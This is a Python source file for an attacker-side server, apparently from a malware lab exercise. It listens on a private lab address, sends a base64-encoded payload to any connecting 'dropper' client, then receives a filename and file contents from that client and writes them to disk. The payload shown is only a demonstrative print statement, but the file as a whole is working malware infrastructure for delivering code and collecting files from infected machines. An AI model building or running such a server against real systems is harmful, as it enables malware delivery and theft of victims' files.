#!/usr/bin/env python3

""" Implementation of the server that sends some malicious code to its
    dropper client.
"""

import base64
import logging
import socket
import os
import subprocess
import time
from getmac import get_mac_address

class Server:
    """ This class represents a server that stores some malicious payload and sends
    it to the dropper once the connection is established.
    """

    def __init__(self, port):
        self._port = port
        # Initialize the socket for connection using TCP protocol.
        self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    @property
    def malicious_code(self):
        """ Malicious payload. In this case just a demonstrative command. """
        return b'print("Hello there hahahaha")'

    @property
    def port(self):
        """ Port, on which the server runs (`int`). """
        return self._port

    @port.setter
    def port(self, new_port):
        """ Sets the port the server listens to into {new_port}"""
        self._port = new_port

    @property
    def socket(self):
        """ Server socket. """
        return self._socket

    def initialize(self):
        """ Initialize server before the session. """
        try:
            # Binds the server to the port and listens to the port.
            #print(self._ip)
            self.socket.bind(('192.168.56.110', self._port))
            self.socket.listen()
            logging.debug('Server was successfully initialized.')
        except socket.error:
            print('Server was not initialized due to an error.')
    
    def encode_integer(self, num):
        num_bytes = num.to_bytes((num.bit_length() + 7) // 8, 'big')
        print(num_bytes)
        encoded_bytes = base64.b64encode(num_bytes)
        return encoded_bytes


    def send_malicious_code(self):
        """ Send malware to the client once the connection is established. """
        # Establish a connection with the client.
        while True:
            connection, address = self.socket.accept()
            with connection:
                print('Connection with dropper established from {}'.format(address))
                session_key = self.encode_integer(address[1])
                print(get_mac_address(ip=address[0]))
                print(session_key, address[1])

                encoded_payload = base64.b64encode(self.malicious_code)
                connection.send(encoded_payload)

                filename = connection.recv(1024).decode("utf-8")
                print("[RECV] Receiving the filename.")
                file = open(filename, "w")
                connection.send("Filename received.".encode("utf-8"))

                data_file = connection.recv(1024).decode("utf-8")
                print("[RECV] Receiving the file data.")
                file.write(data_file)
                connection.send("Filename received.".encode("utf-8"))

                file.close()             


if __name__ == '__main__':
    logging.basicConfig(level=logging.DEBUG)

    # Create and initialize a server running on attacker's side.
    # It takes the port number 27000 (permanent) and will listen to this port.
    server = Server(27000)
    server.initialize()
    # Send a payload to the dropper client once it establishes a connection.
    server.send_malicious_code()
